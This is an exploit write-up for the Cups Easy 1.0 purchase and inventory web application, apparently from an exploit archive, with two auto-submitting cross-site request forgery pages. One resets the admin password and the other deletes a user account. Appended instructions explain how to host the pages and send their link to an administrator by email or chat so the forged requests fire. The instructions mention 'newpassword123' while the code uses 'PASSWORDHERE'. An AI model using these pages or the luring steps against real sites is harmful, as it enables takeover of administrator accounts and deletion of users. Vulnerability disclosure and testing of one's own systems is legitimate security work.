# Title: Cups Easy 1.0 - Cross Site Request Forgery (Password Reset)
# Date: 2020-01-28
# Exploit Author: J3rryBl4nks
# Vendor Homepage: https://sourceforge.net/u/ajayshar76/profile/
# Software Link: https://sourceforge.net/projects/cupseasy/files/cupseasylive-1.0/
# Version: 1.0
# Tested on Windows 10/Kali Rolling
# CVE: CVE-2020-8424, CVE-2020-8425

# The Cups Easy (Purchase & Inventory) 1.0 web application is vulnerable to Cross Site Request Forgery 
# that would allow an attacker to change the Admin password and gain unrestricted 
# access to the site or delete any user.

# Proof of Concept Code for Password Change:

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://SITEADDRESS/cupseasylive/passwordmychange.php" method="POST">
      <input type="hidden" name="username" value="admin" />
      <input type="hidden" name="password" value="PASSWORDHERE" />
      <input type="hidden" name="change" value="Change" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

# Proof of concept for user delete:

<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://SITEADDRESS/cupseasylive/userdelete.php" method="POST">
      <input type="hidden" name="username" value="admin" />
      <input type="hidden" name="delete" value="Delete" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>




Instructions:



Preparation:
Install Cups Easy 1.0:

Download and install Cups Easy 1.0 on a local server or a test environment.
Setup Test Environment:

Ensure the Cups Easy application is running and accessible from a browser.
Log in as an admin user to verify current user accounts and permissions.

Save the HTML code as csrf_password_change.html.
Replace http://[SITEADDRESS] with the actual URL where Cups Easy is hosted.
Modify newpassword123 to the desired new password for the admin account.

Host the csrf_password_change.html file on a web server or use a local file server if testing locally.


Share the URL to the csrf_password_change.html file with an admin or user with sufficient privileges. This could be done via email, chat, or any other method that the target might access.


After the admin or user visits the csrf_password_change.html page, log in to the Cups Easy application to check if the admin password has been changed to newpassword123.


	Testing User Deletion via CSRF:
Save the following HTML code as csrf_user_delete.html:
<!-- CSRF Exploit for Cups Easy 1.0 (User Deletion) -->
<html>
<body>
<script>history.pushState('', '', '/')</script>
  <form action="http://[SITEADDRESS]/cupseasylive/userdelete.php" method="POST">
    <input type="hidden" name="username" value="admin" />
    <input type="hidden" name="delete" value="Delete" />
    <input type="submit" value="Submit request" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
Replace http://[SITEADDRESS] with the actual URL where Cups Easy is hosted.
Modify admin to the username of the account you wish to delete.

Host the csrf_user_delete.html file on a web server or use a local file server if testing locally.

Share the URL to the csrf_user_delete.html file with an admin or user with sufficient privileges. This could be done via email, chat, or any other method that the target might access.

After the admin or user visits the csrf_user_delete.html page, log in to the Cups Easy application to check if the specified user has been deleted.
